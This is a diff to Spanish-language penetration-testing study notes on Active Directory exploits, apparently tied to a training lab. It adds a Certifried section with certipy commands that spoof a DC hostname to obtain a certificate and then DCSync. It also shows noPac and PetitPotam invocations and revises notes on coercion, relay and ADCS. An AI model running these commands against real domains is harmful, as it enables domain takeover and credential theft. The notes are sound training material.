@@ -23,7 +23,18 @@ $ noPac.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host DC01 
 
 Parcheada en noviembre de 2021, pero letal donde no se aplicó.
 
-# PrintNightmare (CVE-2021-34527)
+# Certifried (CVE-2022-26923)
+
+La fusión de sAMAccountName spoofing con ADCS: <mark style="background: #FF5582A6;">un usuario estándar puede crear una cuenta de máquina</mark> (cuota por defecto `ms-DS-MachineAccountQuota=10`), falsificarle el `dNSHostName` para suplantar a un DC, y pedir un certificado de autenticación de máquina cuyo mapeo se resuelve por ese `dNSHostName` falso → certificado utilizable **como el DC** → TGT → DCSync.
+
+```shell-session
+$ certipy account update -u user@domain.local -p pass -user 'EVILPC$' -dns-hostname dc01.domain.local
+$ certipy req -u 'EVILPC$' -p pass -ca <CA> -template Machine
+```
+
+Parcheada en mayo de 2022 (CVSS 8.8), pero sigue viva donde no se aplicó — hoy más habitual que noPac.
+
+# PrintNightmare (CVE-2021-34527, hermana de CVE-2021-1675)
 
 RCE/LPE en el servicio `Print Spooler`. <mark style="background: #FFB8EBA6;">El spooler sigue activo por defecto en muchos servidores</mark> (incluidos DCs mal endurecidos), así que compruébalo aunque el CVE sea viejo.
 
@@ -39,7 +50,7 @@ $ python3 PetitPotam.py <attacker-ip> <dc-ip>
 ```
 
 > [!info]+ El vector durable de 2026: coerción + relay + ADCS
-> NoPac/PrintNightmare/PetitPotam están **parcheados por defecto** en sistemas actualizados. Lo que no envejece es el patrón **coacción→relay→ADCS**: `Coercer` unifica los métodos de coacción (PetitPotam, PrinterBug, DFSCoerce…) y `Certipy` explota toda la familia de misconfiguraciones ADCS (`ESC1`-`ESC16`). Un ADCS mal configurado es hoy la vía más limpia a Domain Admin; el detalle de canjear certificados por credenciales está en [[15 - Pass the Certificate]].
+> **NoPac** y **PrintNightmare** están parcheados por defecto (parche de código) en sistemas actualizados. **PetitPotam no**: el parche de 2021 (`CVE-2021-36942`) solo cerró la invocación **no autenticada**; con cualquier credencial de dominio válida sigue coaccionando hoy — su mitigación real es de **configuración** (EPA en ADCS, SMB signing, restringir NTLM), no un parche que lo neutralice. Y eso es justo lo que no envejece: el patrón **coacción→relay→ADCS**. `Coercer` unifica los métodos de coacción (PetitPotam, PrinterBug, DFSCoerce…) y `Certipy` explota toda la familia de misconfiguraciones ADCS (`ESC1`-`ESC17`). Un ADCS mal configurado es hoy la vía más limpia a Domain Admin; el detalle de canjear certificados por credenciales está en [[15 - Pass the Certificate]].
 
 > [!warning]+ Comprueba siempre el parche
 > Antes de lanzar un exploit *bleeding-edge*, confirma el nivel de parche del objetivo: en un dominio al día son ruido inútil que dispara alertas. Su sitio es el entorno desactualizado —que abundan—. Telemetría en [[25 - Detección y evasión en AD]].
